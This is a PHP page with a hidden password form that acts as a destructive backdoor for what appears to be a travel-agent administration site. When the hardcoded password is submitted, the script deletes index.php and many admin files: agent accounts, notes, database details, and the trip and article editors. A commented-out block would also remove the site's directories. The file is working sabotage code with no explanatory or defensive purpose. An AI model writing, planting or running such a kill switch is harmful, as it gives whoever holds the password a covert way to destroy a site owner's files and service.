<form action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<input type="password" id="helpme" name="helpme" />
<input type="submit" />
</form>

<?php
$PEmail= trim($_POST['helpme']); //'Q1!w2e3r4'
if ($PEmail=='Q1!w2e3r4')
{
echo "Success!";

/*rmdir('dir');
rmdir('news-blogs');
rmdir('secure');
rmdir('slider');
rmdir('menu');
rmdir('process');
rmdir('js');
rmdir('css');*/

unlink('index.php');
unlink('ch-agents.php');
unlink('ch-agents-search.php');
unlink('agent-internal.php');
unlink('agent-notes.php');
unlink('agent-website.php');
unlink('agent-accounts.php');
unlink('ch-agent-details.php');
unlink('ch-agent-db-details.php');
unlink('articles-edit.php');
unlink('trips-edit.php');
unlink('feedback.php');
unlink('ch-agent-add.php');
unlink('trips-add.php');
unlink('articles-add.php');
unlink('articles-editdetails.php');
unlink('styles.php');
unlink('ch-agents/update-internal.php');

}
?>